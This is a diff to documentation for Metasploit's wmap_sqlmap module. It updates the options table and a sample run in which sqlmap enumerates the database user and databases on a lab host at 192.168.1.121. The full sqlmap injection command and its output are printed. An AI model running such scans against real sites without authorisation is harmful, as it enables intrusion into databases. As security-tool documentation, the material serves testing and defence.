@@ -32,43 +32,42 @@ msf auxiliary(wmap_sqlmap) > show options
 
 Module options:
 
-   Name         Current Setting                                      Required  Description
-   ----         ---------------                                      --------  -----------
-   BATCH        true                                                 yes       Never ask for user input, use the default behaviour
-   DATA                                                              no        The data string to be sent through POST
-   METHOD       GET                                                  yes       HTTP Method
-   OPTS         --dbs --current-user                                 no        The sqlmap options to use
-   PATH         /sqlmap/mysql/get_int.php                            yes       The path/file to test for SQL injection
-   Proxies                                                           no        Use a proxy chain
-   QUERY        id=1                                                 no        HTTP GET query
-   RHOSTS       192.168.1.121                                        yes       The target address range or CIDR identifier
-   RPORT        80                                                   yes       The target port
-   SQLMAP_PATH  /home/inquis/software/sqlmap/trunk/sqlmap/sqlmap.py  yes       The sqlmap >= 0.6.1 full path
-   SSL          false                                                no        Use SSL
-   THREADS      1                                                    yes       The number of concurrent threads
-   VHOST                                                             no        HTTP server virtual host
+   Name         Current Setting                                                 Required  Description                                          
+   ----         ---------------                                                 --------  -----------                                          
+   BATCH        true                                                            yes       Never ask for user input, use the default behaviour  
+   BODY                                                                         no        The data string to be sent through POST              
+   METHOD       GET                                                             yes       HTTP Method                                          
+   OPTS         --dbs --current-user                                            no        The sqlmap options to use                            
+   PATH         /sqlmap/mysql/get_int.php                                       yes       The path/file to test for SQL injection              
+   Proxies                                                                      no        Use a proxy chain                                    
+   QUERY        id=1                                                            no        HTTP GET query                                       
+   RHOSTS       192.168.1.121                                                   yes       The target address range or CIDR identifier          
+   RPORT        80                                                              yes       The target port                                      
+   SQLMAP_PATH  /home/inquis/software/sqlmap/trunk/sqlmap/sqlmap.py             yes       The sqlmap >= 0.6.1 full path                        
+   SSL          false                                                           no        Use SSL                                              
+   THREADS      1                                                               yes       The number of concurrent threads                     
+   VHOST                                                                        no        HTTP server virtual host                             
 
 msf auxiliary(wmap_sqlmap) > run
-[*] exec: /home/inquis/software/sqlmap/trunk/sqlmap/sqlmap.py -u 'http://192.168.1.121/sqlmap/mysql/get_int.php?id=1' --method GET --dbs --current-user --batch
+[*] exec: /home/inquis/software/sqlmap/trunk/sqlmap/sqlmap.py -u 'http://192.168.1.121:80//sqlmap/mysql/get_int.php?id=1' --method GET --dbs --current-user --batch
 SQLMAP: 
 SQLMAP: sqlmap/0.6.1 coded by Bernardo Damele A. G. <bernardo.damele@gmail.com>
 SQLMAP: and Daniele Bellucci <daniele.bellucci@gmail.com>
 SQLMAP: 
-SQLMAP: [*] starting at: 01:31:41
+SQLMAP: [*] starting at: 16:23:19
 SQLMAP: 
-SQLMAP: [01:31:42] [WARNING] User-Agent parameter 'User-Agent' is not dynamic
+SQLMAP: [16:23:20] [WARNING] User-Agent parameter 'User-Agent' is not dynamic
 SQLMAP: back-end DBMS:  MySQL >= 5.0.0
 SQLMAP: 
 SQLMAP: current user:    'testuser@localhost'
 SQLMAP: 
-SQLMAP: available databases [4]:
+SQLMAP: available databases [3]:
 SQLMAP: [*] information_schema
 SQLMAP: [*] mysql
-SQLMAP: [*] privatedb
 SQLMAP: [*] test
 SQLMAP: 
 SQLMAP: 
-SQLMAP: [*] shutting down at: 01:31:44
+SQLMAP: [*] shutting down at: 16:23:21
 SQLMAP: 
 [*] Auxiliary module execution completed
 msf auxiliary(wmap_sqlmap) > 
